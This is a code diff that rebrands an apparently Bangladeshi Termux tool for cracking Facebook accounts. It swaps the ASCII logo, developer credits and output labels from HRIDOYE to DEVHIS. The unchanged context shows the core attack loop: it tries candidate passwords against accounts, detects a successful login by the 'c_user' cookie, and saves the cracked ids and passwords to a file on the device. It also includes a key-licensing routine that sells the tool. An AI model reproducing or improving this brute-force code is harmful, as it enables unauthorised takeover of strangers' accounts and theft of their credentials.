@@ -124,16 +124,17 @@ class jalan:
 sys.stdout.write('\x1b[1;35m\x1b]2; MAHIDI X HRIDOY \x07')
 
 logo=("""
-\033[31;1m╔╦╗╔═╗╦ ╦╔═╗╔╦╗╦  ─┐ ┬  ╦ ╦╦═╗╦╔╦╗╔═╗╦ ╦╔═╗
-\033[32;1m║║║╠═╣╠═╣╠═╣ ║║║  ┌┴┬┘  ╠═╣╠╦╝║ ║║║ ║╚╦╝║╣ 
-\033[33;1m╩ ╩╩ ╩╩ ╩╩ ╩═╩╝╩  ┴ └─  ╩ ╩╩╚═╩═╩╝╚═╝ ╩ ╚═╝
+  \x1b[1;92m╔╗╔╗\033[0;33m╔══╗\033[0;34m╔══╗\033[0;35m╔══╗\033[0;31m╔═╦╗ \033[0;36m╔══╗\033[0;37m╔═╦═╗\x1b[1;92m╔══╗\033[0;31m╔═╦═╗
+  \x1b[1;92m║╚╝║\033[0;33m║╔╗║\033[0;34m║══╣\033[0;35m║╔╗║\033[0;31m║║║║ \033[0;36m╚║║╝\033[0;37m║║║║║\x1b[1;92m║╔╗║\033[0;31m║║║║║
+  \x1b[1;92m║╔╗║\033[0;33m║╠╣║\033[0;34m╠══║\033[0;35m║╠╣║\033[0;31m║║║║ \033[0;36m╔║║╗\033[0;37m║║║║║\x1b[1;92m║╠╣║\033[0;31m║║║║║
+  \x1b[1;92m╚╝╚╝\033[0;33m╚╝╚╝\033[0;34m╚══╝\033[0;35m╚╝╚╝\033[0;31m╚╩═╝ \033[0;36m╚══╝\033[0;37m╚╩═╩╝\x1b[1;92m╚╝╚╝\033[0;31m╚╩═╩╝\x1b[1;92m
 \x1b[38;5;46m______________________________________________________
- \033[1;31m[\033[1;32m[H]\033[1;31m]\033[1;32m DEVELOPER : ARIYAN HRIDOYE 
- \033[1;31m[\033[1;32m[R]\033[1;31m]\033[1;32m DEVELOPER : MD MAHADI
- \033[1;31m[\033[1;32m[I]\033[1;31m]\033[1;32m FACEBOOK  : ARIYAN HRIDOYE 
- \033[1;31m[\033[1;32m[D]\033[1;31m]\033[1;32m GITHUB    : MAHADI-HRIDOYE
- \033[1;31m[\033[1;32m[O]\033[1;31m]\033[1;32m TOOLS     : RENDOM
- \033[1;31m[\033[1;32m[Y]\033[1;31m]\033[1;32m VERSION   : \033[1;31m[V-9]
+ \033[1;31m[\033[1;32mS\033[1;31m]\033[1;32m DEVELOPER : HASAN IMAM
+ \033[1;31m[\033[1;32mH\033[1;31m]\033[1;32m TELEGRAM  : TermuxFreeCommandTFC
+ \033[1;31m[\033[1;32mA\033[1;31m]\033[1;32m FACEBOOK  : Hasan Imam 
+ \033[1;31m[\033[1;32mN\033[1;31m]\033[1;32m GITHUB    : X74TEAM
+ \033[1;31m[\033[1;32mT\033[1;31m]\033[1;32m TOOLS     : \x1b[1;92mRANDOM \033[1;37m\x1b[41mFREE\x1b[0m
+ \033[1;31m[\033[1;32mO\033[1;31m]\033[1;32m VERSION   : \033[1;31m[V-1]
 \x1b[38;5;46m_____________________________________________________
 """)
 A = '\x1b[1;97m' 
@@ -211,7 +212,7 @@ def admin():
 		os.system('xdg-open https://www.facebook.com/MDMehedi191');time.sleep(1)
 		admin()
 	if bal =='3':
-		os.system('xdg-open https://github.com/Mr-HRIDOYE-404');time.sleep(1)
+		os.system('xdg-open https://github.com/Mr-DEVHIS-404');time.sleep(1)
 		admin()
 	if bal =='0':
 		Main()
@@ -257,7 +258,7 @@ def b(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[HRIDOYE]\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[DEVHIS]\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -296,10 +297,10 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [HRIDOYE-OK] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [DEVHIS-OK] '+uid+' | '+ps+'\33[0;92m')
                 #print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                 oks.append(cid)
-                open('/sdcard/HRIDOYE-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/DEVHIS-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
@@ -308,7 +309,7 @@ def b(uid,pwx,tl):
 
         pass
 def superuser():
-    UMO="HRIDOYE-"
+    UMO="DEVHIS-"
     uuid = str(os.geteuid()) + str(os.getlogin()) 
     id = "5".join(uuid)
     print(logo)
@@ -331,7 +332,7 @@ def superuser():
         print ("")
         print (" Your Key : "+UMO+id)
         print ("\n")
-        os.system("espeak \"assalamualaikum ,I am HRIDOYE VAI er  ROBOT and my boss is hridoye.Sir this tool is paid because 100% ok id just now login\"")
+        os.system("espeak \"assalamualaikum ,I am DEVHIS VAI er  ROBOT and my boss is DEVHIS.Sir this tool is paid because 100% ok id just now login\"")
         name = input(" Your Name : ")
         os.system(f"espeak \"{name} ,prass Enter to send your key\"")
         print ("")
